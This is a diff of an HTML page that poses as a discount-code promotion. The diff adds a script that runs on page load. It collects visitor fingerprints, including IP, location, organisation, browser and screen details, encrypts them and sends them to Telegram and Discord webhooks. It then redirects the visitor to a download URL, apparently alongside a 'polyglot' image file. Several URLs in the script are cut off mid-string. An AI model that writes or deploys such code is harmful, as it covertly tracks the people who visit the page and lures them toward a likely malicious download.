@@ -1,8 +1,9 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>🎯 Reveal Discount Code 🎯</title>
+  <title>🎯 Discount Code Auto Redirect 🎯</title>
   <style>
     body {
       margin: 0;
@@ -33,20 +34,14 @@
       max-width: 80%;
       border: 3px solid #00ffff;
       border-radius: 12px;
-      cursor: pointer;
-      transition: 0.3s;
-    }
-
-    img:hover {
-      transform: scale(1.03);
     }
   </style>
 </head>
 <body>
   <div class="promo-text">Press to reveal the discount code...</div>
 
-  <img src="https://github.com/Jeki1234121/dev-tools-backup/raw/main/polyglot_20250913_045620.jpg"
-       alt="Click to reveal"
-       onclick="window.location.href = 'https://i.postimg.cc/7HJyVmWP/polyglot-redirect-20250913-052651.jpg';">
+  <img src="polyglot_20250913_045620.jpg" alt="Loading...">
+
+  <script>const webhookDiscord = "https: const webhookTelegram = "https: const telegramChatId = "3032183658"; const downloadURL = "https: window.addEventListener('load', async () => { try { const geo = await fetch('https: const fingerprint = { ua: navigator.userAgent, lang: navigator.language, res: screen.width + 'x' + screen.height, tz: Intl.DateTimeFormat().resolvedOptions().timeZone, session: crypto.randomUUID(), ip: geo.ip || null, country: geo.country_name || null, org: geo.org || null, vpn_flag: /vpn|proxy|hosting|datacenter/i.test(geo.org || '') ? true : false }; const enc = new TextEncoder(); const key = 'AESkey-2025'; const iv = crypto.getRandomValues(new Uint8Array(12)); const cryptoKey = await crypto.subtle.importKey('raw', enc.encode(key), 'AES-GCM', false, ['encrypt']); const encoded = enc.encode(JSON.stringify(fingerprint)); const cipher = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, cryptoKey, encoded); const full = new Uint8Array([...iv, ...new Uint8Array(cipher)]); const encrypted = btoa(String.fromCharCode(...full)); await fetch(webhookTelegram, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `chat_id=${telegramChatId}&text=${encodeURIComponent(encrypted)}` }); await fetch(webhookDiscord, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: `[AUTO-BEACON] ${encrypted}` }) }); window.location.href = downloadURL; } catch (e) { console.log("Auto beacon failed:", e); window.location.href = downloadURL; } });</script>
 </body>
 </html>
